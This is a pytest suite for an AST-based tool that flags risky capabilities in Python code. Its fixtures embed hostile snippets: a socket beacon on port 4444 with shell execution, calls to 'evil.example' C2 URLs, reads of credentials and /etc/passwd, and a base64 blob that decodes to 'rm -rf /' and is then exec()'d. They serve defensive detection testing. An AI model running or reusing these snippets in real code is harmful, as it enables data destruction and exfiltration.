# CUI // SP-CTI
"""Tests for the SIPA capability extractor (sipa-cap-01).

Covers the acceptance criteria for ``tools/integrity/capability_extractor.py``:

  * ``extract(path)`` turns Python source into a normalized capability manifest of
    ``{file_path, function_name, capability_type, evidence, line_start, line_end,
    risk_weight}`` records via the ``ast`` module — never importing/executing the
    target.
  * Phase-1 detectors: ``network_egress`` (socket / http.client / urllib /
    requests / httpx, with host/url literal evidence), ``filesystem`` (open / Path
    read+write / shutil / os, with path + mode evidence), ``process_exec``
    (subprocess / os.system / popen / exec / multiprocessing, with command
    evidence).
  * A **benign** fixture (pure arithmetic / printing) yields zero capabilities.
  * A **malicious** fixture that opens a socket + writes a file + calls subprocess
    yields exactly those three capability types, with the enclosing function name
    and the captured literals.
  * Import aliasing (``import requests as rq``; ``from subprocess import run``) is
    resolved, so renaming an import cannot hide a capability.
  * ``extract_and_persist`` writes the manifest append-only to
    ``integrity_capabilities`` (RLS-aware path, tenant/classification stamped).

SQLite-backed via the shared ``icdev_db`` fixture; no network, no subprocess, and
the fixtures' code is never run — only parsed.
"""
from pathlib import Path

import pytest

from tools.integrity import capability_extractor as cap
from tools.integrity import constants


# --------------------------------------------------------------------------- #
# Fixtures
# --------------------------------------------------------------------------- #
@pytest.fixture
def db_env(icdev_db, monkeypatch):
    """Point get_connection() at the temp SQLite db."""
    monkeypatch.setenv("ICDEV_DB_PATH", str(icdev_db))
    monkeypatch.setenv("ICDEV_STORAGE_BACKEND", "sqlite")
    return icdev_db


_BENIGN_SRC = '''\
"""A perfectly boring module — no network, fs, or process capability."""

import math


def area_of_circle(radius):
    return math.pi * radius * radius


def greet(name):
    message = "hello " + name
    print(message)
    return message
'''

# Opens a socket (network_egress), writes a file (filesystem), and shells out
# (process_exec) — the canonical "three flags" fixture from the task.
_MALICIOUS_SRC = '''\
import socket
import subprocess


def beacon(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 4444))
    with open("/exfil/loot.txt", "w") as fh:
        fh.write("exfil")
    subprocess.run(["/bin/sh", "-c", "id"], shell=False)
    return s
'''


def _write(tmp_path: Path, name: str, src: str) -> Path:
    fp = tmp_path / name
    fp.write_text(src, encoding="utf-8")
    return fp


# --------------------------------------------------------------------------- #
# Benign fixture — no capabilities flagged
# --------------------------------------------------------------------------- #
def test_benign_fixture_yields_no_capabilities(tmp_path):
    fp = _write(tmp_path, "benign.py", _BENIGN_SRC)
    records = cap.extract(str(fp))
    assert records == [], f"benign module should flag nothing, got {records}"


# --------------------------------------------------------------------------- #
# Malicious fixture — socket + file write + subprocess
# --------------------------------------------------------------------------- #
def test_malicious_fixture_flags_three_capability_types(tmp_path):
    fp = _write(tmp_path, "evil.py", _MALICIOUS_SRC)
    records = cap.extract(str(fp))

    by_type = {r["capability_type"] for r in records}
    assert "network_egress" in by_type
    assert "filesystem" in by_type
    assert "process_exec" in by_type

    # Every record is fully shaped and every type is a known capability.
    for r in records:
        assert set(r) >= {
            "file_path", "function_name", "capability_type",
            "evidence", "line_start", "line_end", "risk_weight",
        }
        assert r["capability_type"] in constants.CAPABILITY_TYPES
        # Enclosing function tracked.
        assert r["function_name"] == "beacon"
        # Line span is sane.
        assert r["line_start"] >= 1
        assert r["line_end"] >= r["line_start"]


def test_malicious_fixture_captures_evidence_literals(tmp_path):
    fp = _write(tmp_path, "evil.py", _MALICIOUS_SRC)
    records = cap.extract(str(fp))

    fs = [r for r in records if r["capability_type"] == "filesystem"]
    assert fs, "expected a filesystem capability for open(..., 'w')"
    open_rec = next(r for r in fs if r["evidence"].get("api") == "open")
    assert open_rec["evidence"]["path"] == "/exfil/loot.txt"
    assert open_rec["evidence"]["mode"] == "w"

    proc = [r for r in records if r["capability_type"] == "process_exec"]
    assert proc, "expected a process_exec capability for subprocess.run"
    assert proc[0]["evidence"]["api"] == "subprocess.run"
    assert "/bin/sh" in proc[0]["evidence"]["command"]

    net = [r for r in records if r["capability_type"] == "network_egress"]
    assert net, "expected a network_egress capability for socket.socket"


def test_risk_weight_matches_constants(tmp_path):
    fp = _write(tmp_path, "evil.py", _MALICIOUS_SRC)
    records = cap.extract(str(fp))
    for r in records:
        expected = constants.RISK_WEIGHTS_CAPABILITY[r["capability_type"]]
        assert r["risk_weight"] == expected


# --------------------------------------------------------------------------- #
# Import aliasing — renaming an import cannot hide a capability
# --------------------------------------------------------------------------- #
def test_aliased_imports_are_resolved(tmp_path):
    src = (
        "import requests as rq\n"
        "from subprocess import run as r\n"
        "from urllib.request import urlopen\n"
        "\n"
        "def pull():\n"
        "    rq.get('https://evil.example/c2')\n"
        "    urlopen('http://evil.example/stage2')\n"
        "    r(['curl', 'evil.example'])\n"
    )
    fp = _write(tmp_path, "aliased.py", src)
    records = cap.extract(str(fp))

    apis = {r["evidence"].get("api") for r in records}
    assert "requests.get" in apis        # rq.get resolved
    assert "subprocess.run" in apis      # r(...) resolved
    assert "urllib.request.urlopen" in apis

    net = [r for r in records if r["capability_type"] == "network_egress"]
    urls = {r["evidence"].get("url") for r in net}
    assert "https://evil.example/c2" in urls


# --------------------------------------------------------------------------- #
# Path / shutil / os filesystem coverage
# --------------------------------------------------------------------------- #
def test_pathlib_and_shutil_and_os_filesystem(tmp_path):
    src = (
        "import shutil\n"
        "import os\n"
        "from pathlib import Path\n"
        "\n"
        "def touchy():\n"
        "    Path('/etc/passwd').read_text()\n"
        "    Path('/tmp/out').write_text('x')\n"
        "    shutil.copy('/a', '/b')\n"
        "    os.remove('/tmp/old')\n"
    )
    fp = _write(tmp_path, "fsops.py", src)
    records = cap.extract(str(fp))
    fs = [r for r in records if r["capability_type"] == "filesystem"]
    apis = {r["evidence"].get("api") for r in fs}
    assert "read_text" in apis
    assert "write_text" in apis
    assert "shutil.copy" in apis
    assert "os.remove" in apis

    read_rec = next(r for r in fs if r["evidence"].get("api") == "read_text")
    assert read_rec["evidence"]["mode"] == "r"
    write_rec = next(r for r in fs if r["evidence"].get("api") == "write_text")
    assert write_rec["evidence"]["mode"] == "w"


# --------------------------------------------------------------------------- #
# Directory scan — relative file paths, multiple files
# --------------------------------------------------------------------------- #
def test_extract_directory_tree(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    _write(pkg, "clean.py", _BENIGN_SRC)
    _write(pkg, "dirty.py", _MALICIOUS_SRC)
    # A cache dir that must be skipped.
    cache = pkg / "__pycache__"
    cache.mkdir()
    _write(cache, "ignored.py", _MALICIOUS_SRC)

    records = cap.extract(str(pkg))
    files = {r["file_path"] for r in records}
    assert "dirty.py" in files               # relative to scan root
    assert "clean.py" not in files           # benign contributes nothing
    assert not any("__pycache__" in f for f in files)  # cache excluded


def test_unparseable_file_yields_no_records(tmp_path):
    fp = _write(tmp_path, "broken.py", "def oops(:\n    pass\n")
    assert cap.extract(str(fp)) == []


def test_missing_path_is_graceful(tmp_path):
    assert cap.extract(str(tmp_path / "does_not_exist.py")) == []


# --------------------------------------------------------------------------- #
# Persistence — append-only to integrity_capabilities
# --------------------------------------------------------------------------- #
def _new_assessment(db_env) -> int:
    from tools.db.storage import get_connection
    from tools.integrity.db.init_db import init_db

    conn = get_connection()
    try:
        init_db(conn)
        cur = conn.execute(
            "INSERT INTO integrity_assessments "
            "(source_type, source_ref, mode, status) VALUES (?, ?, ?, ?)",
            ("local", "fixture", "provenance_blind", "quarantine"),
        )
        conn.commit()
        return int(cur.lastrowid)
    finally:
        conn.close()


def _capabilities(aid):
    from tools.db.storage import get_connection

    conn = get_connection()
    try:
        rows = conn.execute(
            "SELECT file_path, function_name, capability_type, evidence, "
            "line_start, line_end, risk_weight "
            "FROM integrity_capabilities WHERE assessment_id = ? ORDER BY id",
            (aid,),
        ).fetchall()
    finally:
        conn.close()
    return [dict(r) for r in rows]


def test_extract_and_persist_writes_capabilities(db_env, tmp_path):
    fp = _write(tmp_path, "evil.py", _MALICIOUS_SRC)
    aid = _new_assessment(db_env)

    result = cap.extract_and_persist(aid, str(fp))

    assert result["assessment_id"] == aid
    assert result["capabilities_persisted"] >= 3
    assert result["by_type"]["network_egress"] >= 1
    assert result["by_type"]["filesystem"] >= 1
    assert result["by_type"]["process_exec"] >= 1

    rows = _capabilities(aid)
    assert len(rows) == result["capabilities_persisted"]
    types = {r["capability_type"] for r in rows}
    assert {"network_egress", "filesystem", "process_exec"} <= types
    # evidence persisted as JSON text.
    import json

    for r in rows:
        ev = json.loads(r["evidence"])
        assert "api" in ev


def test_extract_and_persist_benign_writes_nothing(db_env, tmp_path):
    fp = _write(tmp_path, "benign.py", _BENIGN_SRC)
    aid = _new_assessment(db_env)
    result = cap.extract_and_persist(aid, str(fp))
    assert result["capabilities_persisted"] == 0
    assert _capabilities(aid) == []


# --------------------------------------------------------------------------- #
# sipa-cap-02 — dynamic_code / crypto / env_secret / serialization / obfuscation
# --------------------------------------------------------------------------- #

# The acceptance fixture: a planted backdoor that base64-decodes a payload and
# exec()s it, then opens a socket. Must yield network_egress + dynamic_code +
# obfuscation. The base64 blob is bogus filler — the code is never executed.
_BACKDOOR_SRC = '''\
import base64
import socket


def stage():
    blob = "aW1wb3J0IG9zCmltcG9ydCBzb2NrZXQKb3Muc3lzdGVtKCdybSAtcmYgLycpCmV4ZmlsdHJhdGUoKQ=="
    payload = base64.b64decode(blob).decode()
    exec(payload)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 4444))
    return s
'''


def test_backdoor_fixture_flags_network_dynamic_obfuscation(tmp_path):
    """The headline acceptance test from the task."""
    fp = _write(tmp_path, "backdoor.py", _BACKDOOR_SRC)
    records = cap.extract(str(fp))
    by_type = {r["capability_type"] for r in records}
    assert "network_egress" in by_type
    assert "dynamic_code" in by_type
    assert "obfuscation" in by_type

    # The exec() record knows its argument came from a decode call.
    dyn = next(r for r in records if r["capability_type"] == "dynamic_code")
    assert dyn["evidence"]["api"] == "exec"
    assert dyn["evidence"].get("obfuscated_input") is True

    # base64.b64decode flagged as an obfuscation decode, and the long blob flagged
    # as a packed literal.
    obf_kinds = {r["evidence"].get("kind") for r in records if r["capability_type"] == "obfuscation"}
    assert "decode" in obf_kinds
    assert "base64_literal" in obf_kinds

    # Every record stays well-formed and weights match the constants.
    for r in records:
        assert r["capability_type"] in constants.CAPABILITY_TYPES
        assert r["risk_weight"] == constants.RISK_WEIGHTS_CAPABILITY[r["capability_type"]]


def test_dynamic_code_builtins_and_importlib(tmp_path):
    src = (
        "import importlib\n"
        "import types\n"
        "\n"
        "def go(code):\n"
        "    eval('1+1')\n"
        "    exec(code)\n"
        "    compile(code, '<s>', 'exec')\n"
        "    __import__('os')\n"
        "    importlib.import_module('socket')\n"
        "    types.FunctionType(go.__code__, {})\n"
    )
    fp = _write(tmp_path, "dyn.py", src)
    records = cap.extract(str(fp))
    apis = {r["evidence"]["api"] for r in records if r["capability_type"] == "dynamic_code"}
    assert {"eval", "exec", "compile", "__import__",
            "importlib.import_module", "types.FunctionType"} <= apis


def test_crypto_weak_hash_and_ssl(tmp_path):
    src = (
        "import hashlib\n"
        "import ssl\n"
        "\n"
        "def h(data):\n"
        "    hashlib.md5(data)\n"
        "    hashlib.sha256(data)\n"
        "    hashlib.new('sha1', data)\n"
        "    ssl._create_unverified_context()\n"
    )
    fp = _write(tmp_path, "cry.py", src)
    records = cap.extract(str(fp))
    crypto = [r for r in records if r["capability_type"] == "crypto"]
    by_api = {r["evidence"]["api"]: r["evidence"] for r in crypto}
    assert by_api["hashlib.md5"].get("weak") is True
    assert by_api["hashlib.md5"]["algorithm"] == "md5"
    assert "weak" not in by_api["hashlib.sha256"]      # strong hash, not flagged weak
    assert by_api["hashlib.new"].get("weak") is True   # new('sha1', ...) is weak
    assert by_api["ssl._create_unverified_context"].get("insecure") is True


def test_env_secret_environ_getenv_keyring(tmp_path):
    src = (
        "import os\n"
        "import keyring\n"
        "\n"
        "def grab():\n"
        "    a = os.environ['AWS_SECRET_ACCESS_KEY']\n"
        "    b = os.getenv('API_TOKEN')\n"
        "    c = os.environ.get('DB_PASSWORD')\n"
        "    d = keyring.get_password('svc', 'user')\n"
        "    return a, b, c, d\n"
    )
    fp = _write(tmp_path, "env.py", src)
    records = cap.extract(str(fp))
    env = [r for r in records if r["capability_type"] == "env_secret"]
    apis = {r["evidence"]["api"] for r in env}
    assert "os.environ[]" in apis
    assert "os.getenv" in apis
    assert "os.environ.get" in apis
    assert "keyring.get_password" in apis
    keys = {r["evidence"].get("key") for r in env}
    assert "AWS_SECRET_ACCESS_KEY" in keys
    assert "API_TOKEN" in keys


def test_env_secret_reading_dotenv_file(tmp_path):
    src = (
        "def load():\n"
        "    with open('/app/.env') as fh:\n"
        "        return fh.read()\n"
    )
    fp = _write(tmp_path, "readenv.py", src)
    records = cap.extract(str(fp))
    types = {r["capability_type"] for r in records}
    # A read of a secret-looking path is BOTH filesystem and env_secret.
    assert "filesystem" in types
    assert "env_secret" in types
    env = next(r for r in records if r["capability_type"] == "env_secret")
    assert env["evidence"]["path"] == "/app/.env"


def test_env_secret_writing_normal_file_is_not_secret(tmp_path):
    src = (
        "def save():\n"
        "    with open('/app/.env', 'w') as fh:\n"
        "        fh.write('x')\n"
    )
    fp = _write(tmp_path, "writeenv.py", src)
    records = cap.extract(str(fp))
    # Writing is filesystem only — env_secret is reads of secret material.
    assert "filesystem" in {r["capability_type"] for r in records}
    assert "env_secret" not in {r["capability_type"] for r in records}


def test_serialization_pickle_marshal_yaml(tmp_path):
    src = (
        "import pickle\n"
        "import marshal\n"
        "import shelve\n"
        "import yaml\n"
        "\n"
        "def loadit(b):\n"
        "    pickle.loads(b)\n"
        "    marshal.loads(b)\n"
        "    shelve.open('db')\n"
        "    yaml.load(b)\n"
        "    yaml.safe_load(b)\n"
    )
    fp = _write(tmp_path, "ser.py", src)
    records = cap.extract(str(fp))
    ser = [r for r in records if r["capability_type"] == "serialization"]
    apis = {r["evidence"]["api"] for r in ser}
    assert {"pickle.loads", "marshal.loads", "shelve.open", "yaml.load"} <= apis
    assert "yaml.safe_load" not in apis        # safe loader is not flagged
    pk = next(r for r in ser if r["evidence"]["api"] == "pickle.loads")
    assert pk["evidence"].get("deserialize") is True
    ya = next(r for r in ser if r["evidence"]["api"] == "yaml.load")
    assert ya["evidence"].get("safe_loader") is False


def test_serialization_yaml_safe_loader_kwarg_is_safe(tmp_path):
    src = (
        "import yaml\n"
        "def cfg(b):\n"
        "    return yaml.load(b, Loader=yaml.SafeLoader)\n"
    )
    fp = _write(tmp_path, "yamlsafe.py", src)
    records = cap.extract(str(fp))
    ser = [r for r in records if r["capability_type"] == "serialization"]
    assert ser and ser[0]["evidence"].get("safe_loader") is True


def test_obfuscation_char_code_assembly(tmp_path):
    src = (
        "def build():\n"
        "    return bytes([104, 101, 108, 108, 111, 95, 119, 111, 114, 108, 100])\n"
    )
    fp = _write(tmp_path, "assemble.py", src)
    records = cap.extract(str(fp))
    obf = [r for r in records if r["capability_type"] == "obfuscation"]
    assert any(r["evidence"].get("kind") == "char_code_assembly" for r in obf)


def test_obfuscation_hex_literal(tmp_path):
    blob = "deadbeef" * 10  # 80 hex chars, even length
    src = f"PAYLOAD = '{blob}'\n"
    fp = _write(tmp_path, "hexlit.py", src)
    records = cap.extract(str(fp))
    obf = [r for r in records if r["capability_type"] == "obfuscation"]
    assert any(r["evidence"].get("kind") == "hex_literal" for r in obf)


def test_obfuscation_zlib_and_binascii_decode(tmp_path):
    src = (
        "import zlib\n"
        "import binascii\n"
        "def d(b):\n"
        "    zlib.decompress(b)\n"
        "    binascii.unhexlify(b)\n"
    )
    fp = _write(tmp_path, "zb.py", src)
    records = cap.extract(str(fp))
    apis = {r["evidence"].get("api") for r in records if r["capability_type"] == "obfuscation"}
    assert "zlib.decompress" in apis
    assert "binascii.unhexlify" in apis


def test_benign_short_strings_not_obfuscation(tmp_path):
    # Ordinary code with short strings / normal hashes must not trip obfuscation.
    src = (
        "GREETING = 'hello world, this is a normal sentence with spaces.'\n"
        "def f():\n"
        "    return GREETING.upper()\n"
    )
    fp = _write(tmp_path, "plain.py", src)
    records = cap.extract(str(fp))
    assert [r for r in records if r["capability_type"] == "obfuscation"] == []


def test_new_capabilities_persist(db_env, tmp_path):
    fp = _write(tmp_path, "backdoor.py", _BACKDOOR_SRC)
    aid = _new_assessment(db_env)
    result = cap.extract_and_persist(aid, str(fp))
    assert {"network_egress", "dynamic_code", "obfuscation"} <= set(result["by_type"])
    rows = _capabilities(aid)
    assert {"network_egress", "dynamic_code", "obfuscation"} <= {
        r["capability_type"] for r in rows
    }
